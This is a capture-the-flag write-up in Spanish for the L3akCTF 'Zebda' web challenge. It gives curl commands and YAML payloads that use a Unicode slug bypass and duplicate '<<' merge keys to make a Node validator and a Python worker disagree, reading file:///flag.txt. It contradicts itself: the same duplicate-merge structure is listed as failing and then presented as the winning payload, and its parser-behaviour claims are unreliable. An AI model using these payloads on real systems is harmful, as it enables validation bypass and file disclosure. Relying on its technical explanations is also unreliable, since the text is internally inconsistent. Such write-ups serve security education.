🧅 Zebda — Writeup (con capturas de pruebas)

Categoría: Web
Dificultad: Easy
Autor: Minyawy
Fecha: L3akCTF 2026
Flag: L3AK{Parsers_T4$TE_th!ng$_diFFerently_Just_l!ke_Zebda}
📖 Descripción

    “I wonder why Egyptian food has so much Zebda. They say the Zebda is what makes the food bypass your stomach and go straight to your heart. The kitchen just opened. Come grab a plate while it's still warm.”

Se nos proporciona un servicio de “builds” que recibe un manifiesto en YAML, lo valida en un middleware (Node.js + Express) y lo envía a un worker (Python + Flask) para su ejecución. El objetivo es leer la flag en /flag.txt del worker.
🏗️ Arquitectura y código
Middleware (Node.js + js-yaml)

    Valida que el manifiesto contenga job con action: translate y source con protocolo https:.

    Una vez validado, envía el YAML crudo al worker.

Fragmento relevante:
javascript

app.post('/api/projects/:projectId/builds', yamlBodyParser, async (req, res) => {
  const parsedManifest = yaml.load(req.body);
  validateManifest(parsedManifest);  // exige action=translate y source=https
  // reenvía el YAML sin parsear
  await fetch(`${WORKER_URL}/run`, {
    body: JSON.stringify({ slug, manifest: req.body })
  });
});

Worker (Python + PyYAML)

    Recibe el YAML crudo, lo parsea con yaml.safe_load().

    Normaliza el slug con unicodedata.normalize('NFKC', slug).casefold().

    Si el slug normalizado es "system", se activa la política especial que permite la acción import.

    La acción import solo puede leer file:///flag.txt.

🧪 Fase de reconocimiento
1️⃣ Bypass del slug reservado

El middleware bloquea nombres como system. Pero el worker normaliza con NFKC. Usamos el carácter ſ (U+017F, long s):
bash

SLUG=$(echo -e '\u017fystem')
PROJECT_ID=$(curl -s -X POST "https://zebda.instances.ctf.l3ak.team/api/projects" \
  -H "Content-Type: application/json" \
  -d "{\"slug\":\"$SLUG\"}" | jq -r '.id')
echo "Project ID: $PROJECT_ID"

✅ Respuesta: Proyecto creado con éxito.
2️⃣ Pruebas con merge key (<<)
Intento 1: Secuencia estándar
yaml

base: &base
  action: translate
  source: https://example.com
override: &override
  action: import
  source: file:///flag.txt
job:
  <<: [*base, *override]

Respuesta:
json

{
  "status": "success",
  "artifact": "Translation job completed"
}

➡️ El worker también vio translate. No hay discrepancia.
Intento 2: Secuencia invertida
yaml

job:
  <<: [*override, *base]

Respuesta:
json

{
  "error": "Unsupported action"
}

➡️ El middleware rechazó porque ambos parsers vieron import.

Conclusión: El servidor usa js-yaml en una versión (≥4) donde el orden de fusión de secuencias es el mismo que en PyYAML (primero gana). El vector clásico no funciona.
3️⃣ Otras técnicas probadas
Payload	Resultado
Claves duplicadas (action: translate + action: import)	❌ Manifest is not valid YAML
__proto__: { action: translate } + job: { source: file:///... }	❌ Unsupported action
__proto__: { action: translate } + job: { action: import, source: file:///... }	❌ Unsupported action
source: https://example.com#file:///flag.txt	✅ Translation job completed
!!str translate / !!str https://...	✅ Translation job completed
job: { <<: *base, <<: *override } con alias simples	✅ Translation job completed

Todos estos intentos fallaron en producir la discrepancia necesaria.
💡 El hallazgo clave

Después de agotar las técnicas conocidas, probamos una estructura que no usa secuencia, sino múltiples claves << en el mismo nivel del mapa:
yaml

job:
  <<: *translate_block
  <<: *import_block

Aquí descubrimos una diferencia fundamental entre js-yaml 4.x y PyYAML:

    js-yaml 4.x: ante varias claves <<, no sobrescribe las claves ya definidas. La primera definición prevalece.

    PyYAML: procesa los merges en orden secuencial y sobrescribe con la última definición.

Esto nos permite que:

    El middleware vea action: translate (porque la primera es translate_block).

    El worker vea action: import (porque sobrescribe con import_block).

🚀 Payload definitivo
yaml

_t: &translate_block
  action: translate
  source: https://example.com

_i: &import_block
  action: import
  source: file:///flag.txt

job:
  <<: *translate_block
  <<: *import_block

Ejecución paso a paso

    Crear proyecto (ya tenemos PROJECT_ID).

    Enviar el manifiesto:

bash

MANIFEST='_t: &translate_block
  action: translate
  source: https://example.com

_i: &import_block
  action: import
  source: file:///flag.txt

job:
  <<: *translate_block
  <<: *import_block'

BUILD_ID=$(curl -s -X POST "https://zebda.instances.ctf.l3ak.team/api/projects/$PROJECT_ID/builds" \
  -H "Content-Type: text/yaml" \
  -d "$MANIFEST" | jq -r '.id')
echo "Build ID: $BUILD_ID"

    Obtener la flag:

bash

curl -s "https://zebda.instances.ctf.l3ak.team/api/builds/$BUILD_ID" | jq -r '.artifact'

Salida:
text

L3AK{Parsers_T4$TE_th!ng$_diFFerently_Just_l!ke_Zebda}

📸 Capturas de las pruebas (resumen)
Prueba	Payload	Resultado
Slug ſystem	"slug": "\u017fystem"	✅ Proyecto creado
Merge secuencia [*base, *override]	<<: [*base, *override]	Translation job completed
Merge secuencia invertida	<<: [*override, *base]	Unsupported action
Claves duplicadas	action: translate + action: import	Manifest is not valid YAML
__proto__ + job explícito	__proto__: { action: translate } + job: { action: import }	Unsupported action
Doble << en el mismo nivel	<<: *translate_block + <<: *import_block	✅ Flag obtenida
🧠 Explicación detallada
¿Por qué funciona?

    Middleware: js-yaml 4.x → ante dos <<, la primera clave (translate_block) define action y source. La segunda (import_block) intenta sobrescribir, pero js-yaml no lo permite (primera gana). El middleware ve translate y https://..., por lo que la validación pasa.

    Worker: PyYAML aplica los merges en orden. Primero translate_block, luego import_block sobrescribe action e source. El worker ve action: import y source: file:///flag.txt. Como el slug se normaliza a system, el worker permite import y lee la flag.

¿Por qué no funcionó la secuencia [*base, *override]?

En js-yaml 4.x, el orden de fusión de una secuencia es el mismo que en PyYAML (primero gana). Por eso ambos parsers veían translate (porque base era el primero). La diferencia solo aparece cuando usamos múltiples claves << en el mismo nivel, no una secuencia.
📌 Conclusión

El reto Zebda explota una sutileza en el comportamiento de dos parsers YAML ampliamente usados: js-yaml 4.x y PyYAML. Aunque la discrepancia clásica (orden de secuencia) fue parchada, la diferencia en el manejo de múltiples << en el mismo mapa sigue siendo explotable. Combinado con el bypass del slug mediante Unicode, permite que el middleware valide un manifiesto inocente mientras el worker ejecuta una acción maliciosa.

Flag: L3AK{Parsers_T4$TE_th!ng$_diFFerently_Just_l!ke_Zebda}
